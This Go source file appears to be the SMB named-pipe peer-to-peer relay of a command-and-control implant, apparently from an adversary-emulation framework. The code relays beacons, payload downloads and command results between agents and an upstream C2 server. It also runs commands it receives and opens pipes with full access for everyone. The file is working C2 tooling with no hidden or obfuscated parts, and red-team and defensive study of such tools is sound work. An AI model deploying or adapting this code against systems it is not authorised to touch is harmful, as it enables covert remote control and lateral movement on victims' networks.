// +build windows

package proxy

import (
	"bufio"
	"fmt"
	"net"
	"encoding/json"
	"time"
	"io"
	"regexp"
	"os"
	"math/rand"
	"errors"
	"sync"
	"path/filepath"
	"../winio"
	"../output"
	"../executors/execute"
	"../util"
	"../contact"
	_ "../executors/shellcode" // necessary to initialize all submodules
	_ "../executors/shells"    // necessary to initialize all submodules
)

var (
	// lock for SMBPipeAPI client when editing the ReturnMailBoxPipePaths and ReturnMailBoxListeners for
	// API users (this agent and any downstream agents reaching out to this agent via P2P)
	// Needed because multiple go routines will use the same SmbPipeAPI if the agent is acting
	// as a receiver for multiple client agents, and the upstream comms for the receiver is type SmbPipeAPI.
	apiClientMutex sync.Mutex

	// For writes to the upstream pipe.
	upstreamPipeLock sync.Mutex
)

const (
	pipeCharacters = "abcdefghijklmnopqrstuvwxyz"
	numPipeCharacters = int64(len(pipeCharacters))
	clientPipeNameMinLen = 10
	clientPipeNameMaxLen = 15
	maxChunkSize = 5*4096
	pipeDialTimeoutSec = 10 // number of seconds to wait before timing out of pipe dial attempt.
)

//SmbPipeAPI communicates through SMB named pipes. Implements the Contact interface
type SmbPipeAPI struct {
	// maps agent paws to full pipe paths for receiving forwarded responses on their behalf
	ReturnMailBoxPipePaths map[string]string

	// maps agent paws to Listener objects for the corresponding local pipe paths
	ReturnMailBoxListeners map[string]net.Listener
}

//PipeReceiver forwards data received from SMB pipes to the upstream server. Implements the P2pReceiver interface
type SmbPipeReceiver struct {
	UpstreamComs contact.Contact // Contact implementation to handle upstream communication.
	Listener net.Listener // Listener object for this receiver.
	Server string // Location of upstream server to send data to.
}

func init() {
	P2pClientChannels["SmbPipe"] = &SmbPipeAPI{make(map[string]string), make(map[string]net.Listener)}
	P2pReceiverChannels["SmbPipe"] = &SmbPipeReceiver{nil, nil, ""}
}

// SmbPipeReceiver Implementation (implements Contact interface).

// Listen on agent's main pipe for client connection. This method must be run as a go routine.
func (receiver *SmbPipeReceiver) StartReceiver(profile map[string]interface{}, upstreamComs contact.Contact) {
	hostname, err := os.Hostname()
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Error: cannot set up main pipe. Error obtaining hostname %v", err))
		return
	}
	pipePath := "\\\\.\\pipe\\" + getMainPipeName(hostname)
	receiver.Server = profile["server"].(string)
	receiver.UpstreamComs = upstreamComs
	output.VerbosePrint(fmt.Sprintf("[*] Receiver upstream server set to %s", receiver.Server))
	receiver.startReceiverHelper(profile, pipePath)
}

func (receiver *SmbPipeReceiver) UpdateServerAndComs(newServer string, newComs contact.Contact) {
	receiver.Server = newServer
	receiver.UpstreamComs = newComs
}

// Helper method for StartReceiver.
func (receiver *SmbPipeReceiver) startReceiverHelper(profile map[string]interface{}, pipePath string) {
	listener, err := listenPipeFullAccess(pipePath)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[!] Error with creating listener for pipe: %v", err))
		return
	}
	receiver.Listener = listener
	defer receiver.Listener.Close()
	output.VerbosePrint(fmt.Sprintf("[*] Receiver listening on main handler pipe %s", pipePath))

	// Whenever a client connects to pipe with a request, process the request using a go routine.
	for {
		totalData, err := fetchDataFromPipe(receiver.Listener)
		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[!] Error with reading client input: %v", err))
			continue
		}
		message := BytesToP2pMsg(totalData)
		switch message.MessageType {
			case GET_INSTRUCTIONS:
				go receiver.forwardGetInstructions(message, profile)
			case GET_PAYLOAD_BYTES:
				go receiver.forwardPayloadBytesDownload(message, profile)
			case SEND_EXECUTION_RESULTS:
				go receiver.forwardSendExecResults(message, profile)
			default:
			output.VerbosePrint(fmt.Sprintf("[!] ERROR: invalid instruction type for receiver-bound p2p message: %d", message.MessageType))
		}
	}
}

// Pass the instruction request to the upstream server, and return the response.
func (receiver *SmbPipeReceiver) forwardGetInstructions(message P2pMessage, profile map[string]interface{}) {
    paw := message.RequestingAgentPaw
    output.VerbosePrint(fmt.Sprintf("[*] Forwarding instructions request to %s on behalf of paw %s", profile["server"].(string), paw))

    // Message payload contains profile to send upstream
    var clientProfile map[string]interface{}
    json.Unmarshal(message.Payload, &clientProfile)
    clientProfile["server"] = receiver.Server // make sure we send the instructions to the right place.
    response := receiver.UpstreamComs.GetInstructions(clientProfile)

    // Connect to client mailbox to send response back to client.
    if len(message.SourceAddress) > 0 {
        data, _ := json.Marshal(response)
        forwarderPaw := ""
        if profile["paw"] != nil {
            forwarderPaw = profile["paw"].(string)
        }
        pipeMsgData := BuildP2pMsgBytes(forwarderPaw, RESPONSE_INSTRUCTIONS, data, "")
        sendDataToPipe(message.SourceAddress, pipeMsgData)
        output.VerbosePrint(fmt.Sprintf("[*] Sent instruction response for paw %s via mailbox %s", paw, message.SourceAddress))
    } else {
        output.VerbosePrint(fmt.Sprintf("[-] ERROR. P2p message from client did not specify a return address."))
    }
}

// Pass the payload bytes download request to the upstream server, and return the response.
func (receiver *SmbPipeReceiver) forwardPayloadBytesDownload(message P2pMessage, profile map[string]interface{}) {
    paw := message.RequestingAgentPaw
    output.VerbosePrint(fmt.Sprintf("[*] Forwarding payload bytes request on behalf of paw %s", paw))

    // message payload contains file name (str) and platform (str)
    var fileInfo map[string]string
    json.Unmarshal(message.Payload, &fileInfo)

    // Get upstream response (do not write to disk, just download the data), and forward response to client.
    _, payloadBytes := receiver.UpstreamComs.GetPayloadBytes(fileInfo["file"], profile["server"].(string), paw, fileInfo["platform"], false)
    if len(message.SourceAddress) > 0 {
        forwarderPaw := ""
        if profile["paw"] != nil {
            forwarderPaw = profile["paw"].(string)
        }
        pipeMsgData := BuildP2pMsgBytes(forwarderPaw, RESPONSE_PAYLOAD_BYTES, payloadBytes, "")
        sendDataToPipe(message.SourceAddress, pipeMsgData)
        output.VerbosePrint(fmt.Sprintf("[*] Sent %d payload bytes to client paw %s via mailbox %s", len(payloadBytes), paw, message.SourceAddress))
    } else {
        output.VerbosePrint(fmt.Sprintf("[-] ERROR. P2p message from client did not specify a return address."))
    }
}

func (receiver *SmbPipeReceiver) forwardSendExecResults(message P2pMessage, profile map[string]interface{}) {
    paw := message.RequestingAgentPaw
    output.VerbosePrint(fmt.Sprintf("[*] Forwarding execution results on behalf of paw %s", paw))

    // message payload contains client profile and result info.
    var clientProfile map[string]interface{}
    json.Unmarshal(message.Payload, &clientProfile)
    if clientProfile == nil {
        output.VerbosePrint("[!] Error. Client sent blank message payload for execution results.")
        return
    }
    clientProfile["server"] = receiver.Server
    result := clientProfile["result"].(map[string]interface{})

    // Send execution results upstream. No response will be sent to client.
    receiver.UpstreamComs.SendExecutionResults(clientProfile, result)
}

/*
 * SmbPipeAPI implementation
 */

// Contact API functions

func (p2pPipeClient *SmbPipeAPI) GetInstructions(profile map[string]interface{}) map[string]interface{} {
	var out map[string]interface{}
	needToSetMailBox := false
	requestingPaw := getPawFromProfile(profile)
	mailBoxPipePath, pipePathSet := p2pPipeClient.ReturnMailBoxPipePaths[requestingPaw]
	mailBoxListener, listenerSet := p2pPipeClient.ReturnMailBoxListeners[requestingPaw]
	output.VerbosePrint(fmt.Sprintf("[*] P2P Client: going to fetch instructions for paw %s", requestingPaw))

	if len(requestingPaw) == 0 || !pipePathSet || !listenerSet {
		// Client does not have a paw set up yet or we haven't seen this client before.
		// Create a new mailbox path/listener to set for the client after sending the request upstream.
		needToSetMailBox = true
		output.VerbosePrint("[*] P2P Client: will need to create new mailbox info for new agent client.")
		mailBoxPipePath, mailBoxListener = createNewReturnMailBox()
		if len(mailBoxPipePath) == 0 || mailBoxListener == nil {
			output.VerbosePrint(fmt.Sprintf("[!] Failed to generate mailbox pipe path and listener for paw %s", requestingPaw))
			output.VerbosePrint("[!] Cannot send instruction request.")
			output.VerbosePrint(fmt.Sprintf("[-] P2p beacon via %s: DEAD", profile["server"].(string)))
			return out
		}
	}

	// Send instruction request
	payload, _ := json.Marshal(profile)
	upstreamPipeLock.Lock()
	err := sendRequestToServer(profile["server"].(string), requestingPaw, GET_INSTRUCTIONS, payload, mailBoxPipePath)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[!] Error sending instruction request to server: %v", err))
		output.VerbosePrint(fmt.Sprintf("[-] P2p beacon via %s: DEAD", profile["server"].(string)))
		upstreamPipeLock.Unlock()
		return out
	}

	// Process response.
	respMessage, err := getResponseMessage(mailBoxListener)
	upstreamPipeLock.Unlock()
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[!] Error obtaining instruction response from server: %v", err))
		output.VerbosePrint(fmt.Sprintf("[-] P2p beacon via %s: DEAD", profile["server"].(string)))
		return out
	}
	if MsgIsEmpty(respMessage) {
		output.VerbosePrint(fmt.Sprintf("[-] Empty message from server. P2p beacon DEAD via %s", profile["server"].(string)))
	} else if respMessage.MessageType != RESPONSE_INSTRUCTIONS {
		output.VerbosePrint(fmt.Sprintf("[!] Error: server sent invalid response type for getting instructions: %d", respMessage.MessageType))
		output.VerbosePrint(fmt.Sprintf("[-] P2p beacon via %s: DEAD", profile["server"].(string)))
	} else {
		// Message payload contains instruction info.
		json.Unmarshal(respMessage.Payload, &out)
		if out != nil {
			out["sleep"] = int(out["sleep"].(float64))
			out["watchdog"] = int(out["watchdog"].(float64))
			output.VerbosePrint(fmt.Sprintf("[*] P2p beacon ALIVE via %s", profile["server"].(string)))
			if len(requestingPaw) == 0 {
				// Will set the newly created pipe path and listener for the newly generated paw.
				requestingPaw = out["paw"].(string)
			}

			// Set mailbox info for client paw if needed.
			if needToSetMailBox {
				p2pPipeClient.updateClientPawMailBoxInfo(requestingPaw, mailBoxPipePath, mailBoxListener)
				output.VerbosePrint(fmt.Sprintf("[*] P2P Client: set mailbox pipe path %s for paw %s", mailBoxPipePath, requestingPaw))
			}
		} else {
			output.VerbosePrint(fmt.Sprintf("[-] Empty payload from server. P2p beacon DEAD via %s", profile["server"].(string)))
		}
	}
	return out
}

// Will obtain the payload bytes in memory to be written to disk later by caller.
func (p2pPipeClient *SmbPipeAPI) GetPayloadBytes(payload string, server string, uniqueID string, platform string, writeToDisk bool) (string, []byte) {
	var retBuf []byte
	location := ""
	if len(uniqueID) == 0 {
		output.VerbosePrint("[!] Error: blank or nil paw trying to request payload bytes")
	} else if len(payload) > 0 {
		// Set up mailbox pipe and listener if needed.
		mailBoxPipePath, mailBoxListener := p2pPipeClient.fetchClientMailBoxInfo(uniqueID, true)
		if len(mailBoxPipePath) > 0 && mailBoxListener != nil {
            // Download payload bytes for a single payload. Create SMB Pipe message with
            // payload as a map[string]string specifying the file and platform.
            output.VerbosePrint(fmt.Sprintf("[*] P2p Client Downloading new payload via %s: %s", server, payload))
            fileInfo := map[string]interface{} {"file": payload, "platform": platform}
            msgPayload, _ := json.Marshal(fileInfo)
            upstreamPipeLock.Lock()
            err := sendRequestToServer(server, uniqueID, GET_PAYLOAD_BYTES, msgPayload, mailBoxPipePath)
			if err != nil {
				output.VerbosePrint(fmt.Sprintf("[!] Error sending payload request to server: %v", err))
				upstreamPipeLock.Unlock()
				return location, retBuf
			}

			// Process response.
			respMessage, err := getResponseMessage(mailBoxListener)
			upstreamPipeLock.Unlock()
			if err != nil {
				output.VerbosePrint(fmt.Sprintf("[!] Error obtaining payload response from server: %v", err))
			} else {
                if MsgIsEmpty(respMessage) {
                    output.VerbosePrint("[!] Error: server sent back empty message for payload request.")
                } else if respMessage.MessageType == RESPONSE_PAYLOAD_BYTES {
                    // Payload bytes in message payload.
                    payloadBytes := respMessage.Payload
                    if writeToDisk {
                        // Write payload to disk.
                        location = filepath.Join(payload)
                        util.WritePayloadBytes(location, payloadBytes)
                    } else {
                        // Not writing to disk - return the payload bytes.
                        retBuf = payloadBytes
                    }
                } else {
                    output.VerbosePrint(fmt.Sprintf("[!] Error: server sent invalid response type for getting getting payload bytes: %d", respMessage.MessageType))
                }
             }
        } else {
            output.VerbosePrint("[!] ERROR: failed to set up return mailbox pipe listener. Cannot fetch payload bytes")
        }
	}
	return location, retBuf
}

func (p2pPipeClient *SmbPipeAPI) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
    timeout := int(command["timeout"].(float64))
    result := make(map[string]interface{})
    output, status, pid := execute.RunCommand(command["command"].(string), payloads, command["executor"].(string), timeout)
	result["id"] = command["id"]
	result["output"] = output
	result["status"] = status
	result["pid"] = pid
 	p2pPipeClient.SendExecutionResults(profile, result)
}

// Check if current server is a full pipe path. If not, change profile server
// to full pipe path using current server value and default generated pipe name.
func (p2pPipeClient *SmbPipeAPI) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) bool {
	currentServer := profile["server"].(string)
	match, _ := regexp.MatchString(`^\\\\[^\\]+\\pipe\\[^\\]+$`, currentServer)
	if !match {
		newServer := "\\\\" + currentServer + "\\pipe\\" + getMainPipeName(currentServer)
		output.VerbosePrint(fmt.Sprintf("[*] Changing server value to full pipe path %s", newServer))
		profile["server"] = newServer
	}
    return true
}

func (p2pPipeClient *SmbPipeAPI) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}) {
	requestingPaw := getPawFromProfile(profile)
	if len(requestingPaw) == 0 {
		output.VerbosePrint("[!] Error: blank or nil paw trying to send execution results")
	} else {
		// Set up mailbox pipe and listener if needed.
		mailBoxPipePath, mailBoxListener := p2pPipeClient.fetchClientMailBoxInfo(requestingPaw, true)
		if len(mailBoxPipePath) > 0 && mailBoxListener != nil {
			// Build SMB pipe message for sending execution results.
			// payload will contain JSON marshal of profile, with execution results
			profileCopy := profile
			profileCopy["result"] = result
			msgPayload, _ := json.Marshal(profileCopy)
			output.VerbosePrint(fmt.Sprintf("[*] P2p Client: sending execution results to %s", profile["server"].(string)))
			upstreamPipeLock.Lock()
			err := sendRequestToServer(profile["server"].(string), requestingPaw, SEND_EXECUTION_RESULTS, msgPayload, mailBoxPipePath)
			upstreamPipeLock.Unlock()
			if err != nil {
				output.VerbosePrint(fmt.Sprintf("[!] Error sending execution results to server: %v", err))
				return
			}
		} else {
			output.VerbosePrint("[!] ERROR: failed to set up return mailbox pipe listener. Cannot get response.")
		}
	}
}

/*
 * SMB Read/Write helper functions
 */

// Send a P2pMessage to the server using the specified server pipe path, paw, message type, payload, and return mailbox path.
func sendRequestToServer(pipePath string, paw string, messageType int, payload []byte, returnMailBoxPipePath string) error {
    pipeMsgData := BuildP2pMsgBytes(paw, messageType, payload, returnMailBoxPipePath)
    _, err := sendDataToPipe(pipePath, pipeMsgData)
    return err
}

// Returns the P2pMessage sent to the pipe path for the specified listener.
func getResponseMessage(listener net.Listener) (P2pMessage, error) {
	responseData, err := fetchDataFromPipe(listener)
    if responseData != nil && err == nil {
        respMsg := BytesToP2pMsg(responseData)
        return respMsg, nil
    } else {
        return P2pMessage{}, err
    }
}

// Sends data to specified pipe path. Returns total number of bytes written and errors if any.
func sendDataToPipe(pipePath string, data []byte) (int, error) {
	// Connect to pipe.
	timeout := pipeDialTimeoutSec * time.Second
	conn, err := winio.DialPipe(pipePath, &timeout)
    if err != nil {
        return 0, err
    }
    defer conn.Close()

    // Write data in chunks.
    writer := bufio.NewWriter(conn)
    endIndex := 0
    startIndex := 0
    dataSize := len(data)
    counter := 0
    for ; endIndex < dataSize; {
        endIndex = startIndex + maxChunkSize
        if dataSize <= endIndex {
            endIndex = dataSize
        }
        dataToSend := data[startIndex:endIndex]
        numWritten, err := writePipeData(dataToSend, writer)
        if err != nil {
            output.VerbosePrint(fmt.Sprintf("[!] Error sending data chunk: %v", err))
            return counter, err
        } else {
            counter = counter + numWritten
        }
        startIndex = endIndex
    }
    return counter, nil
}

// Helper function that waits for a connection to the listener and then returns sent data.
func fetchDataFromPipe(listener net.Listener) ([]byte, error) {
    conn, err := listener.Accept()
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with accepting connection to listener: %v", err))
        return nil, err
    }
    defer conn.Close()

    // Read in the data and close connection. If message has been split into chunks,
    // we should read everything in one shot.
    pipeReader := bufio.NewReader(conn)
    receivedData, err := readPipeData(pipeReader)
    if err != nil {
        return nil, err
    }
    return receivedData, nil
}

// Returns data read, along with any non-EOF errors.
func readPipeData(pipeReader *bufio.Reader) ([]byte, error) {
    buffer := make([]byte, 4*1024)
    totalData := make([]byte, 0)
    for {
        n, err := pipeReader.Read(buffer[:cap(buffer)])
        buffer = buffer[:n]
        if n == 0 {
            if err == nil {
                // Try reading again.
                time.Sleep(200 * time.Millisecond)
                continue
            } else if err == io.EOF {
                // Reading is done.
                break
            } else {
                 output.VerbosePrint("[!] Error reading data from pipe")
                 return nil, err
            }
        }

        // Add data chunk to current total
        totalData = append(totalData, buffer...)
        if err != nil && err != io.EOF {
             output.VerbosePrint("[!] Error reading data from pipe")
             return nil, err
        }
    }
    return totalData, nil
}

// Write data using the Writer object. Returns number of bytes written, and an error if any.
func writePipeData(data []byte, pipeWriter *bufio.Writer) (int, error) {
    if data == nil || len(data) == 0 {
        output.VerbosePrint("[!] Warning: attempted to write nil/empty data byte array to pipe.")
        return 0, nil
    }
    if pipeWriter == nil {
        return 0, errors.New("Nil writer object for sending data to pipe.")
    }
    numBytes, err := pipeWriter.Write(data)
    if err != nil {
        if err == io.ErrClosedPipe {
	        output.VerbosePrint("[!] Pipe closed. Not able to flush data.")
	        return numBytes, err
	    } else {
	        output.VerbosePrint(fmt.Sprintf("[!] Error writing data to pipe\n%v", err))
            return numBytes, err
	    }
    }
    err = pipeWriter.Flush()
	if err != nil {
	    if err == io.ErrClosedPipe {
	        output.VerbosePrint("[!] Pipe closed. Not able to flush data.")
	        return numBytes, err
	    } else {
	        output.VerbosePrint(fmt.Sprintf("[!] Error flushing data to pipe\n%v", err))
		    return numBytes, err
	    }
	}
	return numBytes, nil
}

/*
 * Other auxiliary functions
 */

// Fetch the client mailbox path and listener for the specified paw. If none exists, create new ones if the
// flag is set and return the newly made path and listener. Will update mappings in that case.
func (p2pPipeClient *SmbPipeAPI) fetchClientMailBoxInfo(paw string, createNewMailBox bool) (pipePath string, listener net.Listener) {
	mailBoxPipePath, pipePathSet := p2pPipeClient.ReturnMailBoxPipePaths[paw]
	mailBoxListener, listenerSet := p2pPipeClient.ReturnMailBoxListeners[paw]
	if (!pipePathSet || !listenerSet) && createNewMailBox {
		output.VerbosePrint(fmt.Sprintf("[*] P2P Client: will create new mailbox info for paw %s", paw))
		mailBoxPipePath, mailBoxListener = createNewReturnMailBox()
		if len(mailBoxPipePath) == 0 || mailBoxListener == nil {
			output.VerbosePrint(fmt.Sprintf("[!] Failed to generate mailbox pipe path and listener for paw %s", paw))
			return "", nil
		} else {
			p2pPipeClient.updateClientPawMailBoxInfo(paw, mailBoxPipePath, mailBoxListener)
			output.VerbosePrint(fmt.Sprintf("[*] P2P Client: set mailbox pipe path %s for paw %s", mailBoxPipePath, paw))
		}
	}
	return mailBoxPipePath, mailBoxListener
}

// Updates the mailbox information maps for the given paw.
func (p2pPipeClient *SmbPipeAPI) updateClientPawMailBoxInfo(paw string, pipePath string, listener net.Listener) {
	apiClientMutex.Lock()
	defer apiClientMutex.Unlock()
	p2pPipeClient.ReturnMailBoxPipePaths[paw] = pipePath
	p2pPipeClient.ReturnMailBoxListeners[paw] = listener
}

// Set up random pipe name and listener for a new return mailbox.
func createNewReturnMailBox() (pipePath string, listener net.Listener) {
	var mailBoxListener net.Listener = nil
	mailBoxPipePath := ""

    // Generate random pipe name for return mail box pipe path.
    pipeName := getRandPipeName(time.Now().UnixNano())
    hostname, err := os.Hostname()
    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] ERROR obtaining hostname: %v", err))
    } else {
		// Create listener for Pipe
		localPipePath := "\\\\.\\pipe\\" + pipeName
		listener, err := listenPipeFullAccess(localPipePath)
		if listener != nil && err == nil {
			mailBoxListener = listener
			mailBoxPipePath = "\\\\" + hostname + "\\pipe\\" + pipeName
			output.VerbosePrint(fmt.Sprintf("[*] Created return mailbox pipe path %s", mailBoxPipePath))
		} else {
			output.VerbosePrint(fmt.Sprintf("[-] Error when creating listener for pipe path %s: %v", localPipePath, err))
		}
    }
    return mailBoxPipePath, mailBoxListener
}

// Helper function that listens on pipe and returns listener and any error.
func listenPipeFullAccess(pipePath string) (net.Listener, error) {
    config := &winio.PipeConfig{
        SecurityDescriptor: "D:(A;;GA;;;S-1-1-0)", // File all access to everyone.
    }
    return winio.ListenPipe(pipePath, config)
}

// Helper function that creates random pipename of random length, using specified seed.
func getRandPipeName(seed int64) string {
    rand.Seed(seed)
    length := rand.Intn(clientPipeNameMaxLen - clientPipeNameMinLen) + clientPipeNameMinLen
    buffer := make([]byte, length)
    for i := range buffer {
        buffer[i] = pipeCharacters[rand.Int63() % numPipeCharacters]
    }
    return string(buffer)
}

// Helper function that creates a static main pipename using the given string to calculate seed for RNG.
// Pipe name length will also be determined using the string.
func getMainPipeName(seedStr string) string {
	seedNum := 0
	for i, rune := range seedStr {
		seedNum += i*int(rune)
	}
	return getRandPipeName(int64(seedNum))
}

// Return the paw from the profile.
func getPawFromProfile(profile map[string]interface{}) string {
	if profile["paw"] != nil {
		return profile["paw"].(string)
	} else {
		return ""
	}
}